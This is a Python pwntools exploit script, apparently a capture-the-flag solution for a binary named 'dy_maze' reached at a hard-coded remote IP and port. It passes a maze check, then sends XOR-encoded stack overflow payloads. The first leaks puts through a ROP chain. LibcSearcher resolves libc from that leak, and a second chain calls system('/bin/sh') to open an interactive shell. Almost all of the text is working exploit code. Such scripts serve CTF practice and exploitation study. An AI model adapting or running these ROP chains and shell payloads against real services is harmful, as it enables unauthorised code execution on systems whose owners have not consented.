from pwn import *
from LibcSearcher import *
from utils import log,show_ida_patch
from loader import Loader
from pwnlib.util.proc import wait_for_debugger
from struct import pack

loader = Loader("target/dy_maze", 64)
loader.debug()

if 1:
    @log
    def ru(x): return io.recvuntil(x)
    @log
    def rl(): return io.recvline()
    @log
    def sla(x, y): return io.sendlineafter(x, y)
    @log
    def sl(x): return io.sendline(x)
    @log
    def s(x): return io.send(x)
    @log
    def sa(x, y): return io.sendafter(x, y)
else:
    def ru(x): return io.recvuntil(x)
    def rl(): return io.recvline()
    def sla(x, y): return io.sendlineafter(x, y)
    def sl(x): return io.sendline(x)
    def s(x): return io.send(x)
    def sa(x, y): return io.sendafter(x, y)
def psize(x): return loader.psize(x)
def shell(): io.interactive()
def bt(s): return bytes(str(s),encoding='utf-8')
# io = process(loader.root,stdin=PTY)
# wait_for_debugger(io.pid)

pwnfile = [
    '/root/pwn_repos/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so',
    '--library-path',
    '/root/pwn_repos/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386',
    'target/hacknote'
]
# io = process(pwnfile)
# io = loader.process()
io = remote("47.104.169.32", 44212)
# io = loader.remote(28823)
elf = loader.elf


def main():
    # online
    print(io.recv())
    payload0 = input()
    payload0 = bt(payload0)
    print(payload0)
    sl(payload0)
    ru(b'==== Binary Download END ====')
    pause()
    sl(b'qwq')
    io.recv()
    pause()


    s_0_50 = [0x28,0x38,0x4E,0x41,0x9,0x39,0x4,0x0a,0x14,0x1D,0x0F,0x25,0x1e,0x35,0x40,0x11,0x2a,0xe,0x22,0x2b,0x7,0x49,0x21,0x33,0xc,0x2c,0x3e,0x18,0x19,0x17,0x6,0x8,0x10,3,2,0x44,0x4D,0x32,0x37,0x3a,0x2f,0x4A,0x30,0x31,0x29,0x3f,0x15,5,0x12,0x3c]
    s_50_80 = [0x46,0x43,0x51,0x1f,0x4f,0x27,0x50,0x45,0x47,0x3d,0x16,0x4b,0x1c,0x2e,0x4c,1,0x23,0x1a,0x13,0x42,0x34,0x48,0x2d,0x3b,0xd,0x20,0x36,0x26,0xb,0x24]
    s = s_0_50+s_50_80
    pass_maze = b' '.join([bt(i) for i in s])

    def encode(payload):
        payload = bytearray(payload)
        key = [0x12,0xb3,0xbc,0x77,0x2d]
        for i in range(len(payload)):
            payload[i] ^= key[i%5] 
        return bytes(payload)
    sl(pass_maze)
    sla(b'Your name length: ',b'80')
    pop_rdi_ret = 0x042cb13
    ret = 0x00400646 
    func_name = "puts"
    func_got = elf.got[func_name]
    func_plt = elf.plt[func_name]
    next_func = elf.sym['ok_success']
    
    width = 28 # 栈偏移需要debug
    payload = b''.ljust(width, b'*')+psize(pop_rdi_ret)+psize(func_got)+psize(func_plt)+psize(next_func)
    payload = encode(payload)
    sla(b'name: ',payload)
    # print(io.recv())

    func_addr = u64(io.recvuntil(b'\n')[:-1].ljust(8, b'\0'))
    print('fun_addr: ',hex(func_addr))
    obj = LibcSearcher(func_name, func_addr)
    libc_base = func_addr - obj.dump(func_name)  # libc_base_addr
    system = libc_base+obj.dump('system')  # calc funcs addr
    bins = libc_base+obj.dump('str_bin_sh')
    
    print(hex(system),hex(bins))
    payload = b''.ljust(width, b'*')+psize(ret)+psize(pop_rdi_ret)+psize(bins)+psize(system)
    sla(b'Your name length: ',b'100')
    payload = encode(payload)
    sla(b'Input your name: ',payload)
    shell()
    
    
    
    
if __name__ == "__main__":
    main()